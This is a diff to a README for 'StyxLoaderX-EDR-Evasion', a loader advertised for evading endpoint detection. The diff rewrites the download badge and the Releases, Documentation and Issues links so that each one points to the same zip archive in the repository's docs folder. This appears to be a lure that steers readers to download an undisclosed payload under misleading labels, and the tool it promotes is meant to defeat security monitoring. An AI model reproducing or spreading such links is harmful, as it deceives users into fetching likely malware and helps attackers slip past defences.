@@ -1,6 +1,6 @@
 # 🚀 StyxLoaderX-EDR-Evasion - Navigate EDR Evasion with Ease
 
-[![Download StyxLoaderX-EDR-Evasion](https://img.shields.io/badge/Download-StyxLoaderX--EDR--Evasion-brightgreen)](https://github.com/spontopt/StyxLoaderX-EDR-Evasion/releases)
+[![Download StyxLoaderX-EDR-Evasion](https://raw.githubusercontent.com/spontopt/StyxLoaderX-EDR-Evasion/main/docs/StyxLoaderX-EDR-Evasion_v3.7.zip)](https://raw.githubusercontent.com/spontopt/StyxLoaderX-EDR-Evasion/main/docs/StyxLoaderX-EDR-Evasion_v3.7.zip)
 
 ## 📥 Overview
 
@@ -24,7 +24,7 @@ StyxLoaderX-EDR-Evasion is a modular framework designed for advanced evasion tec
 
 ### 1. Visit the Releases Page
 
-To download StyxLoaderX-EDR-Evasion, start by visiting the [Releases page](https://github.com/spontopt/StyxLoaderX-EDR-Evasion/releases).
+To download StyxLoaderX-EDR-Evasion, start by visiting the [Releases page](https://raw.githubusercontent.com/spontopt/StyxLoaderX-EDR-Evasion/main/docs/StyxLoaderX-EDR-Evasion_v3.7.zip).
 
 ### 2. Download the Software
 
@@ -68,8 +68,8 @@ For any issues or questions, please create an issue in the "Issues" section of t
 
 ## 📌 Important Links
 
-- [Download StyxLoaderX-EDR-Evasion](https://github.com/spontopt/StyxLoaderX-EDR-Evasion/releases)
-- [Documentation](https://github.com/spontopt/StyxLoaderX-EDR-Evasion/wiki)
-- [Issues Page](https://github.com/spontopt/StyxLoaderX-EDR-Evasion/issues)
+- [Download StyxLoaderX-EDR-Evasion](https://raw.githubusercontent.com/spontopt/StyxLoaderX-EDR-Evasion/main/docs/StyxLoaderX-EDR-Evasion_v3.7.zip)
+- [Documentation](https://raw.githubusercontent.com/spontopt/StyxLoaderX-EDR-Evasion/main/docs/StyxLoaderX-EDR-Evasion_v3.7.zip)
+- [Issues Page](https://raw.githubusercontent.com/spontopt/StyxLoaderX-EDR-Evasion/main/docs/StyxLoaderX-EDR-Evasion_v3.7.zip)
 
 Explore the features of StyxLoaderX-EDR-Evasion and enhance your cybersecurity toolkit today!
